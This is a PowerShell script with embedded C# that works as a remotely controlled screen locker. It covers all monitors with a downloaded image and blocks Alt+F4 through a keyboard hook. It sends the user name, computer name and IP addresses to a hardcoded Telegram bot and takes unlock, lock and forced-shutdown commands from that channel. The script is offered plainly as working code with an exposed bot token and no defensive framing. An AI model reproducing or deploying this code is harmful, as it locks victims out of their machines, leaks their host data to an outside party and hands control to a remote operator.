# CONFIG
$imageURL = "https://raw.githubusercontent.com/diezul/x/main/1.png"
$tempImagePath = "$env:TEMP\image.jpg"
$botToken = "7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co"
$chatID = "656189986"
$pc = $env:COMPUTERNAME
$user = $env:USERNAME
$lockFile = "$env:APPDATA\lock_status.txt"
$unlockCommand = "/unlock$user"
$lockCommand = "/lock$user"

# INIT LOCK STATE
if (-not (Test-Path $lockFile)) { "locked" | Out-File $lockFile -Force }
$locked = Get-Content $lockFile -ErrorAction SilentlyContinue
if ($locked -eq "unlocked") { return }

# DOWNLOAD IMAGE
Invoke-WebRequest -Uri $imageURL -OutFile $tempImagePath -UseBasicParsing

# NOTIFY TELEGRAM
function Send-Telegram {
    try { $ipLocal = (Get-NetIPAddress -AddressFamily IPv4 | ? { $_.IPAddress -notmatch '^127|169' })[0].IPAddress } catch { $ipLocal = "n/a" }
    try { $ipPublic = Invoke-RestMethod "https://api.ipify.org" } catch { $ipPublic = "n/a" }
    $msg = "🔐 PC-ul $user ($pc) a fost blocat.`nIP: $ipLocal | $ipPublic`n`n/unlock$user`n/lock$user`n/shutdown$user"
    $body = @{ chat_id = $chatID; text = $msg } | ConvertTo-Json -Compress
    Invoke-RestMethod "https://api.telegram.org/bot$botToken/sendMessage" -Method POST -Body $body -ContentType 'application/json'
}
Send-Telegram

# LOAD FORMS
Add-Type -AssemblyName System.Windows.Forms,System.Drawing

# BLOCK ALT+F4
Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;
public class KeyBlocker {
    private static IntPtr hookId = IntPtr.Zero;
    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    private static LowLevelKeyboardProc proc = HookCallback;

    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private const int WM_SYSKEYDOWN = 0x0104;
    private static bool altPressed = false;

    [DllImport("user32.dll")] private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
    [DllImport("user32.dll")] private static extern bool UnhookWindowsHookEx(IntPtr hhk);
    [DllImport("user32.dll")] private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("kernel32.dll")] private static extern IntPtr GetModuleHandle(string lpModuleName);

    public static void Block() { hookId = SetHook(proc); }
    public static void Unblock() { UnhookWindowsHookEx(hookId); }

    private static IntPtr SetHook(LowLevelKeyboardProc proc) {
        using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
        using (var curModule = curProcess.MainModule)
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0) {
            int vkCode = Marshal.ReadInt32(lParam);
            if (vkCode == 0x12) altPressed = true; // ALT
            if ((altPressed && vkCode == 0x73)) return (IntPtr)1; // ALT+F4
            if (vkCode == 0x43) Environment.Exit(0); // Key C = developer unlock
        }
        return CallNextHookEx(hookId, nCode, wParam, lParam);
    }
}
"@
[KeyBlocker]::Block()

# FULLSCREEN FORM
$forms = foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
    $form = New-Object Windows.Forms.Form -Property @{
        FormBorderStyle = 'None'; WindowState = 'Maximized'; TopMost = $true;
        Location = $screen.Bounds.Location; Size = $screen.Bounds.Size;
        Cursor = [System.Windows.Forms.Cursors]::None; BackColor = 'Black'
    }
    $pb = New-Object Windows.Forms.PictureBox -Property @{
        Image = [System.Drawing.Image]::FromFile($tempImagePath); Dock = 'Fill'; SizeMode = 'StretchImage'
    }
    $form.Add_Deactivate({ $form.Activate() })
    $form.Add_FormClosing({ if (-not $script:AllowClose) { $_.Cancel = $true } })
    $form.Controls.Add($pb)
    $form.Show()
    $form
}

# TELEGRAM LISTENER
$script:AllowClose = $false
$offset = 0
try {
    $init = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates"
    if ($init.result.Count -gt 0) { $offset = ($init.result | Select-Object -Last 1).update_id + 1 }
} catch {}

$timer = New-Object System.Windows.Forms.Timer
$timer.Interval = 3000
$timer.Add_Tick({
    try {
        $updates = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates?offset=$offset"
        foreach ($update in $updates.result) {
            $offset = $update.update_id + 1
            $msg = $update.message.text.ToLower().Trim()
            if ($msg -eq "/unlock$user") {
                "unlocked" | Out-File $lockFile -Force
                $script:AllowClose = $true
                [System.Windows.Forms.Application]::Exit()
            }
            elseif ($msg -eq "/lock$user") {
                "locked" | Out-File $lockFile -Force
            }
            elseif ($msg -eq "/shutdown$user") {
                Stop-Computer -Force
            }
        }
    } catch {}
})
$timer.Start()

# START UI LOOP
[System.Windows.Forms.Application]::Run()

# CLEANUP
$timer.Stop()
[KeyBlocker]::Unblock()
